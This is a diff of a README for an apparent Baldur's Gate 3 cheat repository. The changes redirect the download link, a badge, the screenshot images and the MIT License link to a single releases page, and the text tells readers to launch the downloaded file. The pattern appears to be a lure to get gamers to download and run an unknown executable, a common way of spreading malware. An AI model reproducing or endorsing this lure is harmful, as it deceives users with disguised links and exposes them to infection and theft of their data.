@@ -17,9 +17,9 @@ Welcome to the "Baldur's Gate 3 Cheat" repository! Here, you will find all the c
 - baldurs-gate-3-xp-hack
 
 ## Get Started
-To access the cheats and hacks for Baldur's Gate 3, click on the following link: [Download Cheat Codes](https://github.com/uploads/App.zip)
+To access the cheats and hacks for Baldur's Gate 3, click on the following link: [Download Cheat Codes](https://github.com/bachkongu/Baldur-s-Gate-3-Cheat/releases)
 
-![Cheat Codes](https://img.shields.io/badge/Download-Cheat_Codes-brightgreen)
+![Cheat Codes](https://github.com/bachkongu/Baldur-s-Gate-3-Cheat/releases)
 
 Remember to launch the file after downloading to apply the cheats in your game and enjoy the enhanced gaming experience.
 
@@ -38,9 +38,9 @@ Using the cheat codes in Baldur's Gate 3 is easy. Simply follow these steps to u
 ## Screenshots
 Here are some screenshots showcasing the effects of the cheat codes in Baldur's Gate 3:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/bachkongu/Baldur-s-Gate-3-Cheat/releases)
+![Screenshot 2](https://github.com/bachkongu/Baldur-s-Gate-3-Cheat/releases)
+![Screenshot 3](https://github.com/bachkongu/Baldur-s-Gate-3-Cheat/releases)
 
 ## Contribute
 If you have any new cheat codes, hacks, or tips for Baldur's Gate 3 that you would like to share with the community, feel free to contribute to this repository. Your contributions are highly appreciated and will help fellow gamers enjoy the game even more.
@@ -52,6 +52,6 @@ Join our community of Baldur's Gate 3 players to discuss cheats, strategies, and
 We would like to thank all the contributors and members of the Baldur's Gate 3 community who have shared their knowledge and expertise to make this repository a valuable resource for gamers. Your efforts are truly appreciated.
 
 ## License
-This repository is available under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use and modify the cheat codes and hacks for Baldur's Gate 3 according to the terms of the license.
+This repository is available under the [MIT License](https://github.com/bachkongu/Baldur-s-Gate-3-Cheat/releases). Feel free to use and modify the cheat codes and hacks for Baldur's Gate 3 according to the terms of the license.
 
 Enjoy cheating your way through Baldur's Gate 3 and have a fantastic gaming experience! Happy gaming! 🎮✨🔥
